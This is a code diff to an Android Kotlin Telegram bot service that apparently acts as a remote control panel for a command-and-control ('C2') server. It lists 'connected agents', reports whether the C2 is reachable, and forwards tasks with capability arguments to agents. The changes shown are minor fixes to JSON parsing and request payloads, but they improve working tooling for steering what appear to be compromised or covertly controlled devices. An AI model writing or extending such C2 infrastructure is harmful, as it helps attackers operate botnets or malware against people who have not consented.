@@ -138,7 +138,8 @@ class TelegramBotService(private val context: Context) {
         val capability = parts[0]
         val jsonArgs = parts[1]
         try {
-            val argsMap = gson.fromJson(jsonArgs, Map::class.java)
+            val type = object : com.google.gson.reflect.TypeToken<Map<String, Any>>() {}.type
+            val argsMap = gson.fromJson(jsonArgs, type)
             sendTask(chatId, capability, argsMap)
         } catch (e: Exception) {
             sendMessage(chatId, "Invalid JSON args: ${e.message}")
@@ -186,7 +187,8 @@ class TelegramBotService(private val context: Context) {
 
     private fun sendStatus(chatId: Long) {
         val c2Url = getC2Url()
-        sendC2Request(c2Url, "/api/agents") { resp ->
+        val payload = mapOf("action" to "list_agents")
+        sendC2Request(c2Url, "/api/agents", payload) { resp ->
             sendMessage(chatId, "📊 *Agents Status:*\n$resp")
         } ?: run {
             sendMessage(chatId, "❌ C2 unreachable")
@@ -195,7 +197,8 @@ class TelegramBotService(private val context: Context) {
 
     private fun sendAgentsList(chatId: Long) {
         val c2Url = getC2Url()
-        sendC2Request(c2Url, "/api/agents") { resp ->
+        val payload = mapOf("action" to "list_agents")
+        sendC2Request(c2Url, "/api/agents", payload) { resp ->
             sendMessage(chatId, "🤖 *Connected Agents:*\n$resp")
         } ?: run {
             sendMessage(chatId, "❌ C2 unreachable")
